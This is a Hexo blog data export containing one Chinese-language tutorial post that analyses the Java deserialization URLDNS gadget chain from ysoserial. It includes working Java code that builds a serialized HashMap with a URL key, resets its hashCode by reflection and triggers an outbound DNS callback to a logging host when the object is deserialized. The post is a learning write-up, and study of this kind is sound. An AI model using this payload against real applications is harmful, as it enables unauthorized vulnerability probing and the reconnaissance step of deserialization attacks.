{"meta":{"title":"self_209'blog","subtitle":"","description":"","author":"self_209","url":"https://self209.github.io","root":"/"},"pages":[{"title":"all-categories","date":"2021-12-25T10:13:54.918Z","updated":"2021-12-25T10:13:54.918Z","comments":false,"path":"all-categories/index.html","permalink":"https://self209.github.io/all-categories/index.html","excerpt":"","text":""},{"title":"all-tags","date":"2021-12-25T10:15:46.692Z","updated":"2021-12-25T10:15:46.692Z","comments":false,"path":"all-tags/index.html","permalink":"https://self209.github.io/all-tags/index.html","excerpt":"","text":""},{"title":"all-archives","date":"2021-12-25T10:16:57.727Z","updated":"2021-12-25T10:16:57.727Z","comments":false,"path":"all-archives/index.html","permalink":"https://self209.github.io/all-archives/index.html","excerpt":"","text":""}],"posts":[{"title":"java反序列化URLDNS","slug":"20211226","date":"2021-12-26T01:34:26.000Z","updated":"2021-12-28T05:05:32.338Z","comments":true,"path":"2021/12/26/20211226/","link":"","permalink":"https://self209.github.io/2021/12/26/20211226/","excerpt":"初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。","text":"初次接触java反序列化漏洞，通过分析ysoserial工具中的payload，复现漏洞，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。 java原生反序列化JDK类库中的序列化API java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 只有实现了Serializable和Externalizable接口的类的对象才能被序列化。Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以 采用默认的序列化方式 。 对象序列化包括如下步骤： 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流； 通过对象输出流的writeObject()方法写对象。 对象反序列化的步骤如下： 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流； 通过对象输入流的readObject()方法读取对象。 例： 定义一个Student类，实现Serializable接口 123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.Serializable;public class Student implements Serializable &#123; private int age; private String name; private String sex; public Student()&#123; &#125; public Student(String name,int age,String sex)&#123; this.age = age; this.name = name; this.sex = sex; &#125; public int getAge() &#123; return age; &#125; public String getName() &#123; return name; &#125; public String getSex() &#123; return sex; &#125; public void setAge(int age) &#123; this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public void setSex(String sex) &#123; this.sex = sex; &#125;&#125; 序列化和反序列化Student类对象 123456789101112131415161718192021222324252627282930313233343536373839import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.text.MessageFormat;public class SerializeAndDeserialize &#123; public static void main(String[] args) throws Exception &#123; SerializeStudent();//序列化Student对象 Student s = DeserializeStudent();//反序列Student对象 System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;, s.getName(), s.getAge(), s.getSex())); &#125; private static void SerializeStudent() throws FileNotFoundException,IOException &#123; Student student = new Student(&quot;zhangsan&quot;,18,&quot;男&quot;); // ObjectOutputStream 对象输出流，将Student对象存储为Student.txt文件中，完成对Student对象的序列化操作 ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;Student.txt&quot;))); oo.writeObject(student); System.out.println(&quot;Student对象序列化成功！&quot;); oo.close(); &#125; private static Student DeserializeStudent() throws Exception, IOException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream( new File(&quot;Student.txt&quot;))); Student student = (Student) ois.readObject(); System.out.println(&quot;Student对象反序列化成功！&quot;); return student; &#125;&#125; 代码运行结果如下： 反序列化漏洞形成的必要条件漏洞的形成需要找到如下三个条件相关的类，并且都得实现了Serializable接口。 执行类(风险方法类) sink 调用链 gadget chain 入口类 source 1、执行类 存在风险方法，并且传递参数可控 比如： 反射调用参数可控(RCE、SSRF) Runtime类的相关方法(RCE) URL类的相关方法(SSRF) …… 2、调用链 调用链就是将执行类的风险方法与入口类的readObject方法中调用的方法关联或者说联系在一起的一个或多个类的方法，与执行类的风险方法相连接的链，必须是同类型或者说类型宽泛，方法名相同与否都可以，但是方法内必须调用与执行类的风险方法同名，以此类推直至找到与入口类的readObject方法中调用的方法同名的方法，调用链才算完成。 这个解释看不懂没关系，后面在如何寻找gadget chain中会作详细解释。 3、入口类 入口类首先得重写readObject方法，类型越宽泛越好 。例如：HashMap 如何寻找gadget chain这里结合流程图对寻找gadget chain作详细解释，以第一个链为例，后面的链都是一个道理。 假设这里有一个命令执行风险类A,其中的a方法存在命令执行风险(这里不探究具体代码,只是理解调用链的链接方式) 现在我们要找它的第一个链，现在有三个选择 同类不同名方法调用了a() 不同类同名方法调用了a() 不同类不同名方法调用了a() 当我们选择同类不同名方法调用了a()时，需要考虑的是参数ghi是否可控。 当我们选择不同类同名方法调用了a()时，需要考虑的是Abc与Ghi是否是同类型，x2可否控制。 当我们选择不同类不同名方法调用了a()，需要考虑的是Def与Ghi是否是同类型，x1可否控制。 往后的链都是一个道理，直至找到与入口类的readObject方法中，调用的方法同名的方法。 比如：HashMap.readObject()中调用了hash()，那么我们的链找到hash()方法就可以，当然具体能不能用还是要看参数是否可控。 URLDNS Gadget Chain12345ysoserial Gadget Chain: HashMap.readObject()//入口类 HashMap.putVal() HashMap.hash() URL.hashCode() //执行类 从ysoserial工具的payload来看，执行类是URL的hashCode方法，那我们就跟进去URL类去看看。 URL类 123456789 private int hashCode = -1; public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode默认等于-1，那么就会调用handler.hashCode(this); 跟进到handler.hashCode(); 调用handler.hashCode();传入一个URL对象，会调用getHostAddress方法，根据注释Get the IP address of our host.获取主机ip地址，会向host发送请求。 123456789101112131415161718192021222324252627/** * Get the IP address of our host. An empty host field or a DNS failure * will result in a null return. * * @param u a URL object * @return an &#123;@code InetAddress&#125; representing the host * IP address. * @since 1.3 */ protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress; &#125; 好的，现在执行类已经有了，URL.hashCode()。下面开始找调用链，直接搜索hashCode。 嗯。漂亮，1291处这里就不一个一个看了，我们就直接来看payload的Gadget Chain。HashMap.hash() 这里不就是上面所说的，不同类不同名方法调用了hashCode()，我们只需要看是否是同类型，参数是否可控。这里一个类型Object，一个URL，万物皆Object，符合。但是key并不清楚能否控制，接着往下找。 接下来找那些类调用了hash()，不多，有24处，可以稍微看一下。 直接找到了入口类 HashMap.readObject()， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * Reconstitutes this map from a stream (that is, deserializes it). * @param s the stream * @throws ClassNotFoundException if the class of a serialized object * could not be found * @throws IOException if an I/O error occurs */private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it&#x27;s the nearest public type to // what we&#x27;re actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false);//调用hash(key) &#125; &#125;&#125; 在最后的for循环中调用了hash()，传递了参数key，而key就是将集合的泛型K反序列化后的对象，HashMap的泛型K,V都是可以控制。那么我们来捋一下Gadget Chain。 12345678910111213141516Gadget Chain： HashMap.readObject()&#123; hash(key) &#125; HashMap.hash(Object,key)&#123; key.hashCode() &#125; URL.hashCode()&#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode(URL u) &#123; getHostAddress(u); &#125; ysoserial工具的payload中多走了一步HashMap.putVal()，从Gadget Chain中可以看出我们只需要将HashMap.hash(Object,key)方法中的key传递一个URL对象，就会调用URL.hashCode()，hashCode=-1就会调用handler.hashCode(this)，就顺利调用getHostAddress(u)。 那么我们便可以构造代码验证一下 序列化HashMap对象 1234567891011121314151617import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.URL;import java.util.HashMap;public class Serialize &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException&#123; URL url = new URL(&quot;http://7d144017.dns.1433.eu.org&quot;); HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;(); //HashMap&lt;K, V&gt;,K为URL对象，V随意 hashmap.put(url,1); ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;))); oo.writeObject(hashmap); &#125;&#125; 反序列化HashMap对象 1234567891011import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class UnSerialize &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;HashMap.txt&quot;))); ois.readObject(); &#125;&#125; 这时出现了问题，在序列化的时候接收到了请求但是反序列化确没有接收到请求。 经过调试发现，序列化时会发生请求是因为put方法里面也调用了hash()，触发了URL.hashCode，而反序列化时不会发生请求是因为调用到URL.hashCode时，hashCode的值不等于-1，所以进入不到，handler.hashCode(this)，那我们只需要想办法当它序列化时值改为不等于-1的值，调用完put后把他的值改成-1就可以，那要怎么才能改变hashCode的值呢，这里就需要用到Java反射。 改进后的 1234567891011121314151617181920212223242526import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Serialize &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123; URL url = new URL(&quot;http://e5e3bb79.dns.1433.eu.org&quot;); HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;(); //HashMap&lt;K, V&gt;,K为URL对象，V随意 Class c = url.getClass(); Field hashCode = c.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url,-2);//在put前将hashCode的值设置为-2 hashmap.put(url,1); hashCode.set(url,-1);//之后再设置回-1 ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;))); oo.writeObject(hashmap); &#125;&#125; 再次尝试，序列化时没有发生请求。 反序列化发送了请求 至此URLDNS分析完毕。","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java","slug":"java","permalink":"https://self209.github.io/tags/java/"}]}],"categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java","slug":"java","permalink":"https://self209.github.io/tags/java/"}]}